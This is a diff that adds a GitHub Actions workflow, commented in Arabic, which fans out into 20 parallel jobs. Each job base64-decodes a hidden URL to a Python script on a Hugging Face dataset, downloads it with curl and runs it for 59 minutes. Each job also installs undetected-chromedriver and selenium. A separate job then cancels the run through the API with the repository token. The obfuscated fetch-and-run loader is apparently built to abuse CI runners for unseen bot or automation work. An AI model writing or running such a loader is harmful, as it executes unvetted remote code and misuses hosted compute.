@@ -1,1 +1,106 @@
+name: Nested Sentinel Dispatch Lattice
 
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: nested-lattice-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # الرقيب الأعلى: يُطلق أمر الإنهاء عند علامة 59 دقيقة بالضبط
+  # =================================================================
+  supreme-sentinel:
+    name: "Supreme Sentinel"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Arm Sentinel Directive
+        run: |
+          echo "[SENTINEL] Supreme sentinel activated. Directive armed at the 59-minute boundary."
+          echo "[SENTINEL] Execution tag under watch: ${{ github.run_id }}"
+          
+          # فترة الحراسة المحددة (3540 ثانية = 59 دقيقة)
+          sleep 3540
+          
+          echo "[SENTINEL] Boundary crossed! Releasing sentinel directive..."
+          
+          # إرسال أمر الإلغاء عبر GitHub API
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[SENTINEL] Directive released. All operating and queued dispatches will be dissolved."
+
+  # =================================================================
+  # شبكة الإرسال المتوازية: تشكيل وتشغيل عُقد الإرسال
+  # =================================================================
+  dispatch-lattice:
+    name: "LatticeNode-${{ matrix.node_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_key: [401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الفقرة {1}: تهيئة المنصة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Initialize Platform
+        run: |
+          echo "[PLATFORM] Initializing platform for LatticeNode-${{ matrix.node_key }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الفقرة {2}: استلام الوحدة التنفيذية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Receive Execution Unit
+        run: |
+          echo "[RECEIVE] Receiving lattice_core.py from assigned delivery route..."
+          DELIVERY_ROUTE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DELIVERY_ROUTE" -o lattice_core.py
+          echo "[RECEIVE] Execution unit received."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الفقرة {3}: تجهيز الوحدات الداعمة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Equip Support Units
+        run: |
+          echo "[EQUIP] Equipping support units..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الفقرة {4}: التنفيذ المقيّد بـ 59 دقيقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Fire Restricted Sequence
+        run: |
+          echo ">> Firing LatticeNode-${{ matrix.node_key }} sequence..."
+          
+          # تشغيل العملية في الخلفية
+          python3 lattice_core.py &
+          LATTICE_PID=$!
+          
+          echo ">> Restricted sequence fired. Frame: 59 minutes (3540s)."
+          
+          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
+          sleep 3540
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
+          if kill -0 $LATTICE_PID 2>/dev/null; then
+            echo ">> Restricted frame elapsed! Dissolving sequence..."
+            kill -9 $LATTICE_PID
+            echo ">> Sequence dissolved by frame controller."
+          else
+            echo ">> Sequence finished within restricted frame."
+          fi
